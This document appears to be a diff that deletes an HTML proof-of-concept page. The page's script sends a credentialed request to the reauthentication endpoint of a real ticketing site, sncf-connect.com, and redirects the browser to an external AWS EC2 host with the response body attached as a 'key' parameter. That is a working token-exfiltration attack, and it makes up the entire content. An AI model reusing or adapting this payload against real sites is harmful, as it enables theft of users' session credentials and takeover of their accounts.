@@ -1,19 +1,1 @@
-<html>
-<script>
-
-alert(1)
-
-fetch('https://www.sncf-connect.com/bff/api/v1/web-refresh/reauthenticate ', {
-    method: 'POST',
-    credentials: 'include'
-})
-.then(response => response.text())
-.then(responseText => {
-    location.href = 'http://ec2-13-48-27-162.eu-north-1.compute.amazonaws.com/key=' + encodeURIComponent(responseText);
-})
-.catch(error => console.error('Error:', error));
-
-</script>
-
-</html>
 
